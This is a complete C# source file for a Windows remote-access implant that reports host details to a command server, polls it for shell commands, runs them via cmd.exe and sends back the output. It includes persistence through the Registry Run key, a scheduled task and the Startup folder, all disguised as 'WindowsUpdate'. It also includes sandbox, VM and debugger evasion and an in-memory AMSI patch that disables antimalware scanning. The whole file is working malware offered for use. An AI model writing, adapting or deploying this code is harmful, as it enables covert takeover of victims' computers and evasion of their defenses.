using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Win32;

// ═══════════════════════════════════════════════════════════════════════
//  C2 Client — Windows (.NET 8 / Native AOT-friendly)
// ═══════════════════════════════════════════════════════════════════════

namespace C2Client;

// ── JSON models ──────────────────────────────────────────────────────

public record RegisterRequest(
    [property: JsonPropertyName("hostname")]              string Hostname,
    [property: JsonPropertyName("ip_address")]            string IpAddress,
    [property: JsonPropertyName("mac_address")]           string MacAddress,
    [property: JsonPropertyName("os")]                    string Os,
    [property: JsonPropertyName("communication_channel")] string CommunicationChannel = "http"
);

public record RegisterResponse(
    [property: JsonPropertyName("target_id")] string TargetId
);

public class BeaconResponse
{
    [JsonPropertyName("commands")]
    public List<CommandEntry> Commands { get; set; } = new();
}

public class CommandEntry
{
    [JsonPropertyName("id")]      public string Id      { get; set; } = "";
    [JsonPropertyName("command")] public string Command { get; set; } = "";
}

public record ResultRequest(
    [property: JsonPropertyName("output")] string Output
);

// Source-generated JSON context — required for trimmed/AOT publishing
[JsonSerializable(typeof(RegisterRequest))]
[JsonSerializable(typeof(RegisterResponse))]
[JsonSerializable(typeof(BeaconResponse))]
[JsonSerializable(typeof(ResultRequest))]
internal partial class AppJsonContext : JsonSerializerContext { }

// ── System information ───────────────────────────────────────────────

public static class SysInfo
{
    public static string GetHostname() => Environment.MachineName;

    public static string GetOs() =>
        $"Windows {Environment.OSVersion.Version}";

    public static string GetIp()
    {
        try
        {
            using var sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            sock.Connect("8.8.8.8", 80);
            return ((System.Net.IPEndPoint)sock.LocalEndPoint!).Address.ToString();
        }
        catch { return "127.0.0.1"; }
    }

    public static string GetMac()
    {
        try
        {
            var nic = NetworkInterface.GetAllNetworkInterfaces()
                .FirstOrDefault(n => n.OperationalStatus == OperationalStatus.Up
                                  && n.NetworkInterfaceType != NetworkInterfaceType.Loopback);
            if (nic == null) return "00:00:00:00:00:00";
            return string.Join(":", nic.GetPhysicalAddress().GetAddressBytes().Select(b => b.ToString("x2")));
        }
        catch { return "00:00:00:00:00:00"; }
    }
}

// ── Persistence ──────────────────────────────────────────────────────

public static class Persistence
{
    public static bool ViaRegistry(string? exePath = null)
    {
        try
        {
            exePath ??= Environment.ProcessPath ?? Process.GetCurrentProcess().MainModule?.FileName ?? "";
            using var key = Registry.CurrentUser.OpenSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Run", writable: true);
            key?.SetValue("WindowsUpdate", $"\"{exePath}\"", RegistryValueKind.String);
            return true;
        }
        catch { return false; }
    }

    public static bool ViaScheduledTask(string? exePath = null)
    {
        try
        {
            exePath ??= Environment.ProcessPath ?? "";
            var psi = new ProcessStartInfo("schtasks")
            {
                Arguments = $"/create /tn \"WindowsUpdateCheck\" /tr \"\\\"{exePath}\\\"\" /sc onlogon /rl highest /f",
                CreateNoWindow = true,
                UseShellExecute = false,
            };
            Process.Start(psi)?.WaitForExit(5000);
            return true;
        }
        catch { return false; }
    }

    public static bool ViaStartupFolder(string? exePath = null)
    {
        try
        {
            exePath ??= Environment.ProcessPath ?? "";
            var startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            var lnkPath = Path.Combine(startup, "WindowsUpdate.bat");
            File.WriteAllText(lnkPath, $"@echo off\r\nstart \"\" \"{exePath}\"\r\n");
            return true;
        }
        catch { return false; }
    }
}

// ── Anti-analysis ────────────────────────────────────────────────────

public static class AntiAnalysis
{
    public static bool IsSandbox()
    {
        var user = Environment.UserName.ToLower();
        if (new[] { "sandbox", "malware", "virus", "analyst", "sample" }.Any(user.Contains))
            return true;

        string[] vmFiles =
        {
            @"C:\windows\system32\drivers\vmmouse.sys",
            @"C:\windows\system32\drivers\vmhgfs.sys",
            @"C:\windows\system32\drivers\VBoxMouse.sys",
        };
        if (vmFiles.Any(File.Exists))
            return true;

        try
        {
            var psi = new ProcessStartInfo("wmic", "bios get serialnumber")
            { RedirectStandardOutput = true, CreateNoWindow = true, UseShellExecute = false };
            var proc = Process.Start(psi);
            var output = proc?.StandardOutput.ReadToEnd()?.ToLower() ?? "";
            proc?.WaitForExit(3000);
            if (new[] { "vmware", "virtualbox", "qemu", "xen" }.Any(output.Contains))
                return true;
        }
        catch { }

        return false;
    }

    [DllImport("kernel32.dll")]
    private static extern bool IsDebuggerPresent();

    public static bool IsBeingDebugged()
    {
        try { return IsDebuggerPresent(); }
        catch { return false; }
    }
}

// ── AMSI bypass ──────────────────────────────────────────────────────

public static class AmsiBypass
{
    [DllImport("kernel32.dll")]
    private static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    private static extern bool VirtualProtect(IntPtr addr, nuint size, uint newProtect, out uint oldProtect);

    public static bool Patch()
    {
        try
        {
            var amsi = LoadLibrary("amsi.dll");
            if (amsi == IntPtr.Zero) return false;
            var addr = GetProcAddress(amsi, "AmsiScanBuffer");
            if (addr == IntPtr.Zero) return false;

            // mov eax, 0x80070057 (E_INVALIDARG); ret
            byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            VirtualProtect(addr, (nuint)patch.Length, 0x40, out uint oldProtect);
            Marshal.Copy(patch, 0, addr, patch.Length);
            VirtualProtect(addr, (nuint)patch.Length, oldProtect, out _);
            return true;
        }
        catch { return false; }
    }
}

// ── Command execution ────────────────────────────────────────────────

public static class Executor
{
    public static string Run(string command, int timeoutMs = 300_000)
    {
        try
        {
            ProcessStartInfo psi;
            var trimmed = command.TrimStart();

            psi = new ProcessStartInfo("cmd.exe", $"/c {command}")
            {
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true,
                UseShellExecute = false,
            };

            using var proc = Process.Start(psi);
            if (proc == null) return "[ERROR] Failed to start process";

            var stdout = proc.StandardOutput.ReadToEndAsync();
            var stderr = proc.StandardError.ReadToEndAsync();
            proc.WaitForExit(timeoutMs);

            var output = stdout.Result;
            var errors = stderr.Result;
            return string.IsNullOrEmpty(errors)
                ? output.TrimEnd()
                : $"{output}\n{errors}".TrimEnd();
        }
        catch (Exception ex)
        {
            return $"[ERROR] {ex.Message}";
        }
    }
}

// ── Agent core ───────────────────────────────────────────────────────

public class Agent
{
    private readonly HttpClient _http;
    private readonly string _baseUrl;
    private readonly int _intervalMs;
    private readonly double _jitter;
    private readonly Random _rng = new();

    public Agent(string server, int intervalSeconds, double jitter)
    {
        _baseUrl = $"http://{server}/api/v1/agent";
        _intervalMs = intervalSeconds * 1000;
        _jitter = jitter;
        _http = new HttpClient { Timeout = TimeSpan.FromSeconds(30) };
    }

    public async Task<string?> RegisterAsync()
    {
        var req = new RegisterRequest(
            SysInfo.GetHostname(),
            SysInfo.GetIp(),
            SysInfo.GetMac(),
            SysInfo.GetOs()
        );
        var body = JsonSerializer.Serialize(req, AppJsonContext.Default.RegisterRequest);
        try
        {
            var resp = await _http.PostAsync($"{_baseUrl}/register",
                new StringContent(body, Encoding.UTF8, "application/json"));
            resp.EnsureSuccessStatusCode();
            var json = await resp.Content.ReadAsStringAsync();
            var reg = JsonSerializer.Deserialize(json, AppJsonContext.Default.RegisterResponse);
            return reg?.TargetId;
        }
        catch { return null; }
    }

    public async Task<List<CommandEntry>> BeaconAsync(string targetId)
    {
        try
        {
            var resp = await _http.GetAsync($"{_baseUrl}/{targetId}/commands");
            resp.EnsureSuccessStatusCode();
            var json = await resp.Content.ReadAsStringAsync();
            var beacon = JsonSerializer.Deserialize(json, AppJsonContext.Default.BeaconResponse);
            return beacon?.Commands ?? new();
        }
        catch { return new(); }
    }

    public async Task ReportAsync(string targetId, string commandId, string output)
    {
        try
        {
            var body = JsonSerializer.Serialize(new ResultRequest(output), AppJsonContext.Default.ResultRequest);
            await _http.PostAsync(
                $"{_baseUrl}/{targetId}/commands/{commandId}/result",
                new StringContent(body, Encoding.UTF8, "application/json"));
        }
        catch { /* swallow — will retry on next beacon */ }
    }

    public async Task RunLoopAsync()
    {
        Console.WriteLine($"[*] C2 Client (.NET) — connecting to {_baseUrl}");

        // Register
        string? targetId = null;
        while (targetId == null)
        {
            Console.WriteLine("[*] Registering ...");
            targetId = await RegisterAsync();
            if (targetId != null)
            {
                Console.WriteLine($"[+] Registered as {targetId}");
                break;
            }
            Console.WriteLine("[-] Registration failed, retrying ...");
            await Task.Delay(_intervalMs);
        }

        // Beacon loop
        while (true)
        {
            try
            {
                var commands = await BeaconAsync(targetId);
                foreach (var cmd in commands)
                {
                    if (string.IsNullOrWhiteSpace(cmd.Command)) continue;
                    Console.WriteLine($"[>] Executing {cmd.Id[..Math.Min(8, cmd.Id.Length)]}...");
                    var output = Executor.Run(cmd.Command);
                    Console.WriteLine($"[<] Result ({output.Length} bytes)");
                    await ReportAsync(targetId, cmd.Id, output);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Beacon error: {ex.Message}");
            }

            var sleep = _intervalMs * (1.0 + _jitter * (2.0 * _rng.NextDouble() - 1.0));
            await Task.Delay(Math.Max(1000, (int)sleep));
        }
    }
}

// ── Entry point ──────────────────────────────────────────────────────

// BuildConfig is generated by the .csproj GenerateBuildConfig target
// (see BuildConfig.g.cs in the intermediate output).
// Defaults live in the .csproj PropertyGroup: C2Server, C2Interval, C2Jitter.
static partial class BuildConfig { }

public static class Program
{
    public static async Task Main(string[] args)
    {
        // Resolve: env var C2_SERVER > build-time constant > hardcoded fallback
        string server    = Environment.GetEnvironmentVariable("C2_SERVER") ?? BuildConfig.Server;
        int    interval  = BuildConfig.Interval;
        double jitter    = BuildConfig.Jitter;
        string persist   = "none";     // none | registry | schtask | startup
        bool   amsi      = false;
        bool   sandbox   = false;
        bool   debugChk  = false;

        // Arg parse
        for (int i = 0; i < args.Length; i++)
        {
            switch (args[i])
            {
                case "--server" or "-s":
                    if (i + 1 < args.Length) server = args[++i];
                    break;
                case "--interval" or "-i":
                    if (i + 1 < args.Length) int.TryParse(args[++i], out interval);
                    break;
                case "--jitter" or "-j":
                    if (i + 1 < args.Length) double.TryParse(args[++i], out jitter);
                    break;
                case "--persist":
                    if (i + 1 < args.Length) persist = args[++i];
                    break;
                case "--amsi-bypass":
                    amsi = true;
                    break;
                case "--sandbox-check":
                    sandbox = true;
                    break;
                case "--debug-check":
                    debugChk = true;
                    break;
                case "--help" or "-h":
                    PrintUsage();
                    return;
            }
        }

        // Anti-analysis
        if (sandbox && AntiAnalysis.IsSandbox())
        {
            Console.WriteLine("[!] Sandbox detected — exiting");
            return;
        }
        if (debugChk && AntiAnalysis.IsBeingDebugged())
        {
            Console.WriteLine("[!] Debugger detected — exiting");
            return;
        }

        // AMSI
        if (amsi)
        {
            var ok = AmsiBypass.Patch();
            Console.WriteLine(ok ? "[+] AMSI patched" : "[-] AMSI patch failed");
        }

        // Persistence
        switch (persist)
        {
            case "registry":
                Persistence.ViaRegistry();
                Console.WriteLine("[+] Persistence: Registry Run key");
                break;
            case "schtask":
                Persistence.ViaScheduledTask();
                Console.WriteLine("[+] Persistence: Scheduled Task");
                break;
            case "startup":
                Persistence.ViaStartupFolder();
                Console.WriteLine("[+] Persistence: Startup folder");
                break;
        }

        var agent = new Agent(server, interval, jitter);
        await agent.RunLoopAsync();
    }

    private static void PrintUsage()
    {
        Console.WriteLine(@"C2Client.exe — Windows native C2 implant (.NET)

Options:
  -s, --server <host:port>   C2 server (default: 127.0.0.1:8000)
  -i, --interval <sec>       Beacon interval (default: 10)
  -j, --jitter <0-1>         Jitter factor (default: 0.3)
  --persist <method>          none | registry | schtask | startup
  --amsi-bypass               Patch AMSI in memory
  --sandbox-check             Exit if VM/sandbox detected
  --debug-check               Exit if debugger attached

Build:
  dotnet publish -c Release -r win-x64 --self-contained true /p:PublishSingleFile=true /p:PublishTrimmed=true
");
    }
}
